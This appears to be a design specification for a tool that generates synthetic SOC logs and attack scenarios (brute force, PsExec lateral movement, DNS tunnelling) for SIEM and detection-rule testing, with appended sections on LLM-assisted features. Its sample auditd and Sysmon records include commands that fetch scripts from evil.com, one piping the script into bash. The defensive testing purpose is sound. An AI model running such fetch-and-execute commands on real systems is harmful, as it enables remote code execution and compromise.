# SOC Log Generator - Technical Specifications

## 1. Overview

### 1.1 Purpose
A professional, modular log generator for SOC (Security Operations Center) and MSSP (Managed Security Service Provider) environments. It simulates realistic enterprise environments with multi-source security logs including attack scenarios for SIEM testing and detection rule validation.

### 1.2 Target Users
- SOC analysts testing detection rules
- MSSP teams validating SIEM configurations  
- Security engineers developing parsers
- Red teams simulating attack chains

### 1.3 Core Requirements
- Multi-source log generation (Endpoint, Network, Cloud, Security tools)
- Realistic temporal patterns (business hours, weekends, seasonal variations)
- Attack scenario injection (APT, insider threat, ransomware)
- Multiple output formats (JSON ECS, CEF, Syslog RFC 5424)
- High performance (up to 10,000 EPS)
- Extensible architecture for custom generators

---

## 2. Architecture

### 2.1 High-Level Design

```
┌─────────────────────────────────────────────────────────────────┐
│                    SOC Log Generator                             │
├─────────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐  │
│  │  Core       │  │  Asset      │  │  Scenario               │  │
│  │  Engine     │◄─┤  Inventory  │◄─┤  Engine                 │  │
│  └──────┬──────┘  └─────────────┘  └─────────────────────────┘  │
│         │                                                        │
│         ▼                                                        │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │                    Generator Registry                      │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐  │   │
│  │  │ Windows  │ │ Linux    │ │ Firewall │ │ Cloud (AWS)  │  │   │
│  │  │ Linux    │ │ Auth     │ │ PaloAlto │ │ Azure        │  │   │
│  │  │ Sysmon   │ │ Auditd   │ │ Fortinet │ │ O365         │  │   │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────────┘  │   │
│  └──────────────────────────┬────────────────────────────────┘   │
│                             │                                    │
│                             ▼                                    │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │                    Output Router                           │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐  │   │
│  │  │ File     │ │ Syslog   │ │ Kafka    │ │ HTTP/Splunk  │  │   │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────────┘  │   │
│  └───────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Module Hierarchy

```
soc-log-generator/
├── core/
│   ├── __init__.py
│   ├── engine.py              # Main generation orchestrator
│   ├── events.py              # LogEvent dataclass and formats
│   ├── inventory.py           # AssetInventory management
│   ├── rate_limiter.py        # Token bucket rate limiting
│   └── outputs.py             # Output handler base classes
├── generators/
│   ├── __init__.py
│   ├── base.py                # BaseGenerator abstract class
│   ├── endpoint/
│   │   ├── windows.py         # Windows Event Log + Sysmon
│   │   └── linux.py           # Syslog, auditd, auth
│   ├── network/
│   │   ├── firewall.py        # PaloAlto, Fortinet, Cisco
│   │   ├── proxy.py           # Web proxy logs
│   │   └── dns.py             # DNS query logs
│   ├── cloud/
│   │   ├── aws.py             # CloudTrail, VPC Flow
│   │   ├── azure.py           # Azure AD, Activity Logs
│   │   └── gcp.py             # GCP Audit Logs
│   └── security/
│       ├── edr.py             # CrowdStrike, Defender
│       └── ids.py             # Suricata, Snort
├── scenarios/
│   ├── __init__.py
│   ├── base.py                # Scenario base class
│   ├── brute_force.py         # SSH/Windows brute force
│   ├── lateral_movement.py    # SMB, WMI, PsExec
│   ├── data_exfiltration.py   # DNS tunneling, HTTPS upload
│   └── ransomware.py          # File encryption patterns
├── outputs/
│   ├── __init__.py
│   ├── file.py                # File output with rotation
│   ├── syslog.py              # TCP/UDP syslog
│   ├── kafka.py               # Kafka producer
│   └── http.py                # HTTP POST (Splunk HEC, etc.)
├── config/
│   └── default.yaml           # Default configuration
├── tests/
│   └── ...
└── main.py                    # CLI entry point
```

---

## 3. Core Components

### 3.1 Event Model (core/events.py)

#### 3.1.1 LogEvent Class
```python
@dataclass
class LogEvent:
    timestamp: datetime          # UTC timestamp with microseconds
    source_type: str             # windows, linux, firewall, etc.
    source_ip: str              # Source IP address
    source_host: str            # Hostname
    message: str                # Human-readable message
    raw_log: str                # Original/vendor-specific format
    severity: EventSeverity     # LOW, MEDIUM, HIGH, CRITICAL
    fields: Dict[str, Any]      # Structured fields (ECS-compatible)
    tags: List[str]             # Classification tags
    
    # Output format methods
    def to_json(self) -> str    # ECS-compliant JSON
    def to_cef(self) -> str     # Common Event Format
    def to_syslog(self) -> str  # RFC 5424
```

#### 3.1.2 Event Severity Levels
| Level | Value | Use Case |
|-------|-------|----------|
| LOW | 1 | Informational, routine activity |
| MEDIUM | 2 | Policy violations, suspicious patterns |
| HIGH | 3 | Confirmed threats, policy breaches |
| CRITICAL | 4 | Active attacks, data exfiltration |

### 3.2 Asset Inventory (core/inventory.py)

#### 3.2.1 Asset Types
- **Workstations**: Windows 10/11, macOS
- **Servers**: Windows Server 2019/2022, Ubuntu, RHEL
- **Network**: Firewalls, Switches, Routers, Proxies
- **Cloud**: EC2 instances, Azure VMs, GCE instances
- **Users**: Domain users, service accounts, admins
- **Groups**: AD groups, local groups

#### 3.2.2 Coherence Requirements
- IP addresses must be consistent within subnets
- User-to-workstation mappings must be realistic
- Group memberships must follow role patterns
- Temporal consistency (assets online/offline at realistic times)

### 3.3 Rate Limiter (core/rate_limiter.py)

#### 3.3.1 Token Bucket Algorithm
- Precise EPS control without burst artifacts
- Per-generator rate limiting
- Dynamic rate adjustment for ramp-up/ramp-down

#### 3.3.2 Temporal Profiles
```python
class TimeProfile:
    base_eps: float                    # Base events per second
    business_hours_multiplier: float   # 9-18h multiplier
    lunch_dip: float                   # 12-14h reduction
    night_dip: float                   # 22-6h reduction
    weekend_multiplier: float          # Sat-Sun reduction
    
    def get_current_eps(self) -> float
```

---

## 4. Generators

### 4.1 BaseGenerator (generators/base.py)

```python
class BaseGenerator(ABC):
    def __init__(self, config: Dict[str, Any], inventory: AssetInventory):
        self.config = config
        self.inventory = inventory
        self.source_type: str
        self.weight: float                # Relative weight vs other generators
        self.time_profile: TimeProfile
    
    @abstractmethod
    def generate_event(self) -> LogEvent:
        """Generate a single log event"""
        pass
    
    @abstractmethod
    def get_supported_events(self) -> List[str]:
        """Return list of event types this generator supports"""
        pass
```

### 4.2 Windows Generator (generators/endpoint/windows.py)

#### 4.2.1 Supported Channels
| Channel | Event IDs | Volume % |
|---------|-----------|----------|
| Security | 4624, 4625, 4634, 4648, 4672, 4688, 4689, 4720, 4728, 4732, 4738, 4740, 4768, 4769, 4771, 4776 | 45% |
| Sysmon | 1-26 (Process, Network, DNS, File, Registry, WMI, Driver) | 30% |
| System | 7036, 7034, 7040, 6005, 6006 | 15% |
| PowerShell | 4103, 4104, 4105, 4106 | 10% |

#### 4.2.2 Event ID 4624 (Logon) - Detailed Fields
- SubjectUserSid, SubjectUserName, SubjectDomainName
- TargetUserSid, TargetUserName, TargetDomainName
- LogonType (2, 3, 7, 10)
- IpAddress, IpPort
- ProcessName, ProcessId
- Status, SubStatus, AuthenticationPackage

#### 4.2.3 Sysmon Event ID 1 (Process Create) - Detailed Fields
- RuleName, UtcTime, ProcessGuid, ProcessId
- Image, CommandLine, CurrentDirectory
- User, LogonGuid, LogonId, TerminalSessionId
- IntegrityLevel, Hashes (MD5, SHA256, IMPHASH)
- ParentProcessGuid, ParentProcessId, ParentImage
- ParentCommandLine, ParentUser

### 4.3 Linux Generator (generators/endpoint/linux.py)

#### 4.3.1 Supported Services
| Service | Log Types | Volume % |
|---------|-----------|----------|
| SSH (sshd) | Accepted/Failed passwords, invalid users, disconnects | 35% |
| Sudo | Command execution, authentication failures | 25% |
| Auditd (auditd) | Syscalls (execve, connect, open), file integrity | 20% |
| Kernel (iptables) | Firewall drops, connection tracking | 10% |
| Cron | Job executions | 5% |
| Systemd | Service start/stop/failures | 5% |

#### 4.3.2 SSH Brute Force Pattern
```
Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
Failed password for invalid user root from 192.168.1.100 port 54322 ssh2
Failed password for invalid user test from 192.168.1.100 port 54323 ssh2
...
Accepted password for jdoe from 10.0.10.15 port 54330 ssh2  [legitimate after brute]
```

#### 4.3.3 Auditd Execve Event
```
type=SYSCALL msg=audit(1709812345.123:12345): arch=c000003e syscall=59 success=yes exit=0 a0=7f... a1=7f... a2=7f... a3=0 items=2 ppid=1234 pid=5678 auid=1000 uid=1000 gid=1000 euid=1000 suid=0 fsuid=0 egid=1000 sgid=0 fsgid=1000 tty=pts0 ses=1 comm="curl" exe="/usr/bin/curl" key="command_logging"
type=EXECVE msg=audit(1709812345.123:12345): argc=2 a0="curl" a1="http://evil.com/data.sh"
type=CWD msg=audit(1709812345.123:12345): cwd="/home/jdoe"
type=PATH msg=audit(1709812345.123:12345): item=0 name="/usr/bin/curl" inode=123456 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
type=EOE msg=audit(1709812345.123:12345): 
```

### 4.4 Linux Sysmon Generator (generators/endpoint/linux_sysmon.py)

#### 4.4.1 Overview
Linux Sysmon (sysmonforlinux) is Microsoft's official port of Sysmon to Linux using eBPF. It provides process monitoring, network connection tracking, and file integrity monitoring similar to Windows Sysmon.

#### 4.4.2 Supported Event Types
| Event ID | Event Name | Description | Volume % |
|----------|------------|-------------|----------|
| 1 | ProcessCreate | Process creation with full command line | 40% |
| 3 | NetworkConnect | Network connection attempts | 25% |
| 5 | ProcessTerminate | Process termination | 10% |
| 9 | RawAccessRead | Raw disk/sector access | 5% |
| 11 | FileCreate | File creation operations | 15% |
| 16 | SysmonConfigChange | Configuration changes | 1% |
| 23 | FileDelete | File deletion (archived) | 4% |

#### 4.4.3 Linux Sysmon Event Schema
```json
{
  "EventTime": "2024-03-07T10:30:45.123456Z",
  "EventType": "ProcessCreate",
  "EventId": 1,
  "Computer": "SRV-LNX-001",
  "User": "jdoe",
  "RuleName": "technique_id=T1059,technique_name=Command-Line Interface",
  "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
  "ProcessId": 12345,
  "Image": "/usr/bin/curl",
  "CommandLine": "curl -s http://evil.com/payload.sh | bash",
  "CurrentDirectory": "/home/jdoe",
  "ParentProcessGuid": "{87654321-4321-4321-4321-210987654321}",
  "ParentProcessId": 1000,
  "ParentImage": "/bin/bash",
  "ParentCommandLine": "bash",
  "ParentUser": "jdoe",
  "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
  "LogonId": 1000,
  "TerminalSessionId": 1,
  "IntegrityLevel": "no level",
  "Hashes": "MD5=5FD22C9A9E6F8F1B6E3D2A1C8B7F6E5D,SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899",
  "User": "jdoe"
}
```

#### 4.4.4 Key Differences from Windows Sysmon
- **eBPF-based**: Uses eBPF probes instead of kernel drivers
- **No Registry Events**: Linux has no registry (use file monitoring instead)
- **Different Integrity Levels**: Linux uses DAC/SELinux/AppArmor
- **No Driver Loading Events**: Linux kernel modules differ from Windows drivers
- **Process Architecture**: Native support for fork/exec vs Windows CreateProcess

#### 4.4.5 Installation Artifacts
```
/opt/sysmon/config.xml          # Configuration file
/var/log/syslog                 # Default log destination
/var/log/sysmon/               # Alternative log directory
/etc/systemd/system/sysmon.service  # Service definition
```

### 4.5 Firewall Generator (generators/network/firewall.py)

#### 4.4.1 Supported Vendors
| Vendor | Log Format | Fields |
|--------|------------|--------|
| PaloAlto | CSV/CEF | action, app, src/dst zones, bytes, threats |
| Fortinet | Syslog/CEF | devname, vd, policyid, attack, url |
| Cisco ASA | Syslog | %ASA-6-302013, connection built/teardown |

#### 4.4.2 Traffic Log Fields
- Start Time, Type, Action (allow/deny/drop)
- Source Zone, Destination Zone
- Ingress Interface, Egress Interface
- Source IP, Destination IP
- Protocol, Source Port, Destination Port
- Application, Category, Subcategory
- Session ID, Bytes Sent/Received, Packets
- Elapsed Time

#### 4.4.3 Threat Log Fields
- Subtype (virus, spyware, vulnerability, filetype)
- Threat ID, Threat Category, Threat Name
- Severity, Action (alert/block/allow)
- URL, File Name, File Type
- User Agent, Referer

---

## 5. Scenarios

### 5.1 Scenario Base Class
```python
class AttackScenario(ABC):
    def __init__(self, config: Dict[str, Any], inventory: AssetInventory):
        self.config = config
        self.inventory = inventory
        self.start_time: datetime
        self.duration: int  # seconds
    
    @abstractmethod
    def generate_events(self) -> Generator[LogEvent, None, None]:
        """Yield events for this scenario"""
        pass
    
    @abstractmethod
    def is_complete(self) -> bool:
        pass
```

### 5.2 Brute Force Scenario

#### 5.2.1 Phases
1. **Reconnaissance** (30s): Port scan from attacker IP
2. **Enumeration** (60s): Username enumeration attempts
3. **Brute Force** (5-10min): Rapid password attempts
4. **Success/Failure**: Either successful login or abandonment

#### 5.2.2 Event Chain (Linux SSH)
```
T+0s    sshd: Invalid user admin from 192.168.1.100
T+1s    sshd: Invalid user root from 192.168.1.100
T+1s    sshd: Failed password for invalid user root from 192.168.1.100
...
T+180s  sshd: Accepted password for jdoe from 192.168.1.100  [SUCCESS]
T+181s  auditd: USER_LOGIN success
T+181s  auditd: SYSCALL execve (bash)
```

### 5.3 Lateral Movement Scenario

#### 5.3.1 Techniques Supported
- PsExec (Sysinternals)
- WMI Exec (wmic process call create)
- Scheduled Tasks (at.exe, schtasks.exe)
- PowerShell Remoting (WinRM)
- SMB File Copy + Service Creation

#### 5.3.2 Event Chain (PsExec)
```
Source Host (WK-WIN-001):
- 4688: psexec.exe \\WK-WIN-002 -u admin -p *** cmd.exe
- 4648: Explicit credentials logon
- 3: Network connection to WK-WIN-002:445

Target Host (WK-WIN-002):
- 4624: Logon Type 3 (Network) from WK-WIN-001
- 4672: Special privileges assigned (SeDebugPrivilege)
- 4688: cmd.exe spawned by services.exe
- 4688: whoami.exe, net.exe, etc.
- 4634: Logoff
```

### 5.4 Data Exfiltration Scenario

#### 5.4.1 Methods
- DNS Tunneling (high volume of TXT queries)
- HTTPS POST to cloud storage (OneDrive, Dropbox)
- ICMP tunneling
- Steganography in legitimate HTTP traffic

#### 5.4.2 DNS Tunneling Pattern
```
Normal: ~100 DNS queries/hour/workstation
Attack: 5000+ DNS queries/hour with:
- Subdomains: base64data.evil-domain.com
- Query types: TXT (large payloads)
- Destinations: External DNS servers (8.8.8.8, etc.)
```

---

## 6. Outputs

### 6.1 Output Interface
```python
class OutputHandler(ABC):
    @abstractmethod
    def write(self, event: LogEvent) -> bool:
        pass
    
    @abstractmethod
    def write_batch(self, events: List[LogEvent]) -> int:
        """Return number of successfully written events"""
        pass
    
    @abstractmethod
    def close(self):
        pass
    
    @abstractmethod
    def health_check(self) -> bool:
        pass
```

### 6.2 File Output
- Path: configurable
- Rotation: size-based (default 100MB)
- Compression: optional gzip for archived files
- Format: JSON Lines (JSONL), one event per line

### 6.3 Syslog Output
- Protocol: TCP (default) or UDP
- Port: 514 (default)
- Formats: RFC 3164, RFC 5424
- TLS: optional for secure transmission
- Reconnection: exponential backoff

### 6.4 Kafka Output
- Bootstrap servers: configurable
- Topic: configurable per source type or single topic
- Partitioning: by source_host for ordering guarantees
- Acknowledgments: all (default for durability)

---

## 7. Configuration

### 7.1 Configuration Schema (YAML)
```yaml
version: "1.0"

global:
  timezone: "UTC"
  seed: 12345                    # For reproducible generation
  duration: 0                    # 0 = infinite

inventory:
  domains: [...]
  subnets: [...]
  users: [...]
  assets: [...]

generators:
  windows:
    enabled: true
    weight: 1.0
    eps: 150
    time_profile:
      business_hours_mult: 2.0
      night_dip: 0.2
    channels: [...]
  linux:
    enabled: true
    weight: 0.8
    eps: 100
  firewall:
    enabled: true
    weight: 1.5
    eps: 300
    vendor: "paloalto"

scenarios:
  enabled: true
  injection_probability: 0.1     # 10% chance per hour
  
  brute_force_ssh:
    enabled: true
    max_duration: 600
    attempts_range: [10, 100]
  
  lateral_movement:
    enabled: true
    techniques: ["psexec", "wmi", "schtasks"]

outputs:
  - type: file
    path: "/var/log/soc/logs.json"
    rotation_size: "100MB"
  
  - type: syslog
    host: "siem.company.com"
    port: 514
    protocol: "tcp"
    format: "cef"
```

---

## 8. Performance Requirements

### 8.1 Throughput Targets
| EPS | CPU Usage | Memory | Disk I/O |
|-----|-----------|--------|----------|
| 100 | < 5% | < 50MB | 15 KB/s |
| 1,000 | < 15% | < 200MB | 150 KB/s |
| 5,000 | < 40% | < 800MB | 750 KB/s |
| 10,000 | < 80% | < 1.5GB | 1.5 MB/s |

### 8.2 Scalability
- Horizontal: Multiple generator processes with different seeds
- Vertical: Multi-threading within single process
- Batch mode: Group events for efficient output writes

---

## 9. Testing Strategy

### 9.1 Unit Tests
- Event generation correctness
- Format conversion (JSON, CEF, Syslog)
- Rate limiter accuracy
- Asset inventory consistency

### 9.2 Integration Tests
- End-to-end generation with file output
- Syslog server compatibility
- Scenario injection correctness

### 9.3 Validation Tests
- Parse generated logs with target SIEM parsers
- Verify detection rules fire on attack scenarios
- Confirm temporal patterns match expectations

---

## 10. Milestones

### Phase 1: Core (Week 1)
- [ ] Core engine (events, inventory, rate limiter)
- [ ] Base generator classes
- [ ] File output handler
- [ ] CLI interface

### Phase 2: Endpoint (Week 2)
- [ ] Windows generator (Security, Sysmon)
- [ ] Linux generator (auth, auditd)
- [ ] Syslog output handler

### Phase 3: Network (Week 3)
- [ ] Firewall generator (PaloAlto, Fortinet)
- [ ] Proxy generator
- [ ] DNS generator

### Phase 4: Scenarios (Week 4)
- [ ] Brute force scenario
- [ ] Lateral movement scenario
- [ ] Data exfiltration scenario
- [ ] Scenario injection engine

### Phase 5: Polish (Week 5)
- [ ] Configuration file support
- [ ] Metrics and monitoring
- [ ] Documentation and examples
- [ ] Performance optimization

---

## 11. Appendix

### 11.1 ECS Field Mapping
Generated logs should be ECS-compatible where applicable:
- `@timestamp` -> event timestamp
- `source.*` -> source asset information
- `destination.*` -> destination asset information
- `user.*` -> user identity information
- `process.*` -> process information
- `file.*` -> file information
- `network.*` -> network connection information
- `threat.*` -> threat intelligence

### 11.2 References
- ECS: https://www.elastic.co/guide/en/ecs/current/index.html
- CEF: https://www.microfocus.com/documentation/arcsight/arcsight-smartconnectors-8.3/cef-implementation-standard/
- Syslog RFC 5424: https://tools.ietf.org/html/rfc5424
- Windows Event IDs: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624
- Sysmon: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon


---

## 6. AI-Powered Features

### 6.1 Log Learning System (ai/learning.py)

The Log Learning System allows users to feed real log samples to improve generator accuracy and add new sources.

#### 6.1.1 Core Capabilities
- **Pattern Extraction**: Analyze log samples to extract field patterns
- **Generator Enhancement**: Improve existing generators with real-world samples
- **New Source Detection**: Automatically identify unknown log formats
- **Field Mapping**: Map vendor-specific fields to ECS format
- **Anomaly Learning**: Learn normal vs suspicious patterns

#### 6.1.2 Input Methods
```python
class LogLearningSystem:
    def learn_from_file(self, filepath: str, source_hint: Optional[str] = None) -> LearningResult:
        """Learn from a file containing log samples."""
        pass
    
    def learn_from_stream(self, stream: Iterator[str], format_hint: Optional[str] = None) -> LearningResult:
        """Learn from a stream of log lines."""
        pass
    
    def learn_from_samples(self, samples: List[str], labels: List[str]) -> LearningResult:
        """Learn from labeled samples."""
        pass
```

#### 6.1.3 Learning Process
1. **Format Detection**: Identify JSON, CSV, Key-Value, Syslog, CEF formats
2. **Field Extraction**: Extract field names and value types
3. **Pattern Recognition**: Identify timestamps, IPs, hashes, PIDs
4. **Statistics**: Calculate value distributions and frequencies
5. **Generator Template**: Produce a generator template

#### 6.1.4 Example Usage
```bash
# Learn from real log file
python -m soc_log_generator learn \
  --input /var/log/real-app/app.log \
  --format auto \
  --output generators/application/myapp.py

# Interactive learning mode
python -m soc_log_generator learn --interactive

# Improve existing generator
python -m soc_log_generator enhance \
  --generator windows \
  --samples /path/to/windows-samples/
```

### 6.2 AI/LLM Integration (ai/llm_integration.py)

Integration with local and cloud AI models for intelligent log generation.

#### 6.2.1 Supported AI Providers
| Provider | Model | Use Case | Local/Cloud |
|----------|-------|----------|-------------|
| **Ollama** | Llama 3, Mistral, CodeLlama | Local generation, privacy | Local |
| **OpenAI** | GPT-4, GPT-3.5 | Complex scenario generation | Cloud |
| **Anthropic** | Claude | Document analysis, threat intel | Cloud |
| **Google** | Gemini | Multi-modal analysis | Cloud |
| **Local LLM** | Custom models | Air-gapped environments | Local |

#### 6.2.2 AI-Powered Features

##### Log Format Understanding
```python
class LLMLogAnalyzer:
    def analyze_format(self, sample_logs: List[str]) -> FormatAnalysis:
        """
        Use LLM to understand unknown log formats.
        Returns structured analysis of fields, patterns, and semantics.
        """
        pass
    
    def generate_parser(self, format_analysis: FormatAnalysis) -> str:
        """Generate Python parser code from LLM analysis."""
        pass
```

##### Scenario Generation from Threat Intel
```python
class LLMScenarioGenerator:
    def generate_from_cisa_alert(self, alert_text: str) -> ScenarioDefinition:
        """Convert CISA alert text into executable scenario."""
        pass
    
    def generate_from_mitre(self, technique_id: str) -> ScenarioDefinition:
        """Generate scenario based on MITRE ATT&CK technique."""
        pass
    
    def enhance_scenario(self, base_scenario: ScenarioDefinition, context: str) -> ScenarioDefinition:
        """Enhance scenario with additional realistic details."""
        pass
```

##### Natural Language Interface
```bash
# Generate logs via natural language
python -m soc_log_generator ask \
  "Generate a ransomware attack scenario that starts with phishing, 
   escalates privileges, and encrypts files over 6 hours"

# Get help on available sources
python -m soc_log_generator ask \
  "What log sources are available for a healthcare environment?"
```

#### 6.2.3 Ollama Integration (Local AI)
```yaml
# config/ai.yaml
ai:
  provider: ollama
  ollama:
    host: "http://localhost:11434"
    model: "codellama:13b"
    temperature: 0.7
    
  # Model-specific settings
  log_analysis_model: "llama3:8b"
  scenario_generation_model: "mistral:7b"
  parser_generation_model: "codellama:13b"
```

### 6.3 Web Research Module (research/web_research.py)

Automated research for discovering and validating log formats.

#### 6.3.1 Capabilities
- **Vendor Documentation Scraping**: Extract log format docs from vendor sites
- **GitHub Log Samples**: Search public repos for sample logs
- **Format Validation**: Verify against known schemas
- **Community Sources**: Query StackOverflow, Reddit, forums

#### 6.3.2 Research Sources
| Source | Type | API/Method |
|--------|------|------------|
| Vendor Docs | Official | Scraping, API |
| GitHub | Community | Search API |
| StackOverflow | Q&A | StackAPI |
| Splunkbase | Apps | Scraping |
| Sigma Rules | Detection | GitHub API |

#### 6.3.3 Usage
```bash
# Research a specific log source
python -m soc_log_generator research \
  --source "Palo Alto Cortex XDR" \
  --output generators/security/cortex_xdr.py

# Update existing generator with new format info
python -m soc_log_generator research \
  --update-generator windows \
  --check-version "2024"

# Discover new sources automatically
python -m soc_log_generator research \
  --discover \
  --category "endpoint" \
  --output-dir generators/endpoint/
```

---

## 7. Parser Framework

### 7.1 Parser Base Classes (parsers/base.py)

Extensible framework for parsing real logs into structured events.

#### 7.1.1 Parser Interface
```python
class LogParser(ABC):
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.field_mappings: Dict[str, str] = {}
    
    @abstractmethod
    def parse(self, raw_log: str) -> Optional[ParsedEvent]:
        """Parse a single log line."""
        pass
    
    @abstractmethod
    def detect(self, sample: str) -> float:
        """Return confidence score (0.0-1.0) that this parser handles the format."""
        pass
    
    def normalize(self, parsed: ParsedEvent) -> LogEvent:
        """Convert to standard LogEvent format."""
        pass
```

#### 7.1.2 Built-in Parsers
| Parser | Formats | Use Case |
|--------|---------|----------|
| JSONParser | JSON logs | Modern applications |
| CSVParser | CSV/TSV | Tabular logs |
| SyslogParser | RFC3164, RFC5424 | System logs |
| CEFParser | CEF 0.0-1.0 | ArcSight compatible |
| KeyValueParser | k1=v1 k2=v2 | Firewall, proxy |
| RegexParser | Custom regex | Legacy formats |
| GrokParser | Logstash grok patterns | Elastic compatible |

### 7.2 Parser Generator (parsers/generator.py)

Generate parsers from samples automatically.

```python
class ParserGenerator:
    def generate_from_samples(self, samples: List[str], 
                              language: str = "python") -> str:
        """
        Generate parser code from sample logs.
        Uses LLM + pattern analysis.
        """
        pass
    
    def generate_grok_pattern(self, samples: List[str]) -> str:
        """Generate Logstash grok pattern."""
        pass
    
    def generate_regex(self, samples: List[str]) -> str:
        """Generate Python regex pattern."""
        pass
```

---

## 8. Business/Vertical Sources

### 8.1 Industry-Specific Log Sources

Support for vertical-specific applications and systems.

#### 8.1.1 Healthcare (HIPAA)
| Source | System | Log Types |
|--------|--------|-----------|
| **Epic** | EHR | Access logs, audit trails |
| **Cerner** | EHR | Authentication, data access |
| **Meditech** | EHR | User activity, alerts |
| **DICOM** | Medical Imaging | PACS access, image transfers |
| **HL7/FHIR** | Interoperability | Message logs, API calls |
| **Medical Devices** | IoT | Device status, alarms |

#### 8.1.2 Financial Services
| Source | System | Log Types |
|--------|--------|-----------|
| **SWIFT** | Payments | Message flows, sanctions |
| **FIX Protocol** | Trading | Order execution, market data |
| **Core Banking** | Banking | Transactions, auth |
| **Anti-Fraud** | Security | Risk scoring, alerts |
| **ATM/POS** | Payments | Transaction logs |
| **Market Data** | Trading | Bloomberg, Refinitiv feeds |

#### 8.1.3 Manufacturing (OT/ICS)
| Source | System | Log Types |
|--------|--------|-----------|
| **SCADA** | Control Systems | Historian, alarms |
| **DCS** | Distributed Control | Process logs |
| **PLC** | Controllers | Ladder logic, I/O |
| **HMI** | Interfaces | Operator actions |
| **OPC-UA** | Protocol | Data access logs |
| **Modbus** | Protocol | Communication logs |

#### 8.1.4 Retail/E-Commerce
| Source | System | Log Types |
|--------|--------|-----------|
| **POS** | Point of Sale | Sales, inventory |
| **E-commerce** | Web | Cart, checkout, payment |
| **Inventory** | ERP | Stock movements |
| **CRM** | Customer | Salesforce, Dynamics |
| **Payment Gateway** | Finance | Stripe, Adyen logs |

#### 8.1.5 Telecommunications
| Source | System | Log Types |
|--------|--------|-----------|
| **SS7/Diameter** | Signaling | Call/SMS logs |
| **GTP** | Mobile Core | Data sessions |
| **SIP** | VoIP | Call records |
| **Network OSS** | Operations | Faults, performance |
| **5G Core** | 5G | AMF, SMF, UPF logs |

### 8.2 Custom Business Application Generator

```python
class BusinessAppGenerator(BaseGenerator):
    """
    Generic generator for custom business applications.
    Configured via YAML with learned patterns.
    """
    
    def __init__(self, config: Dict[str, Any], inventory: AssetInventory):
        super().__init__(config)
        self.app_name = config['app_name']
        self.learned_patterns = config.get('patterns', [])
        self.field_definitions = config.get('fields', {})
```

---

## 9. Configuration Extensions

### 9.1 AI Configuration
```yaml
ai:
  enabled: true
  providers:
    ollama:
      enabled: true
      host: "http://localhost:11434"
      models:
        analysis: "llama3:8b"
        generation: "mistral:7b"
      timeout: 30
      
    openai:
      enabled: false
      api_key: "${OPENAI_API_KEY}"
      model: "gpt-4"
      
  features:
    log_learning: true
    scenario_generation: true
    parser_generation: true
    natural_language: true
    
  learning:
    min_samples: 10
    max_samples: 1000
    validation_split: 0.2
```

### 9.2 Business Sources Configuration
```yaml
business_sources:
  healthcare:
    epic:
      enabled: true
      eps: 50
      modules: ["access", "medication", "orders"]
    
    dicom:
      enabled: true
      eps: 20
      modalities: ["CT", "MRI", "XR"]
      
  financial:
    swift:
      enabled: true
      eps: 100
      message_types: ["MT103", "MT202", "MT950"]
      
    fix_protocol:
      enabled: true
      eps: 500
      version: "4.4"
      
  manufacturing:
    scada:
      enabled: true
      eps: 200
      protocols: ["Modbus", "DNP3", "OPC-UA"]
```

### 9.3 Parser Configuration
```yaml
parsers:
  auto_detect: true
  custom_parsers:
    - name: "myapp"
      type: "regex"
      pattern: '^(?P<timestamp>\d{4}-\d{2}-\d{2}) (?P<level>\w+): (?P<message>.*)$'
      timestamp_format: "%Y-%m-%d %H:%M:%S"
      field_mappings:
        level: "log.level"
        message: "event.original"
```

---

## 10. API and Extensibility

### 10.1 REST API (api/server.py)

```python
from fastapi import FastAPI

app = FastAPI()

@app.post("/learn")
async def learn_from_samples(samples: List[str], source_hint: Optional[str] = None):
    """Submit log samples for learning."""
    pass

@app.post("/generate")
async def generate_logs(config: GenerationConfig):
    """Start log generation."""
    pass

@app.post("/research")
async def research_source(query: ResearchQuery):
    """Research a log source."""
    pass

@app.post("/ask")
async def natural_language_query(query: str):
    """Natural language interface."""
    pass
```

### 10.2 Plugin System
```python
# Entry point for custom generators
setup(
    entry_points={
        'soc_log_generator.generators': [
            'my_custom = my_package:MyGenerator',
        ],
        'soc_log_generator.parsers': [
            'my_parser = my_package:MyParser',
        ],
    },
)
```

---

## Appendix B: AI Prompts

### B.1 Log Format Analysis Prompt
```
Analyze the following log samples and provide:
1. Log format type (JSON, CSV, Syslog, etc.)
2. Field names and their data types
3. Timestamp format
4. Any patterns or structures
5. ECS field mappings where applicable

Samples:
{samples}

Respond in structured JSON format.
```

### B.2 Scenario Generation Prompt
```
Generate a SOC log scenario based on:
- Attack Type: {attack_type}
- MITRE ATT&CK: {technique_id}
- Duration: {duration}
- Sources: {sources}

Include:
1. Event sequence with timestamps
2. Field values for each event
3. Correlation points
4. Expected detection rules
```

### B.3 Parser Generation Prompt
```
Generate a Python log parser for the following samples:
{samples}

Requirements:
- Use regex or structured parsing
- Return dict with extracted fields
- Include timestamp parsing
- Handle edge cases

Provide only the Python code.
```
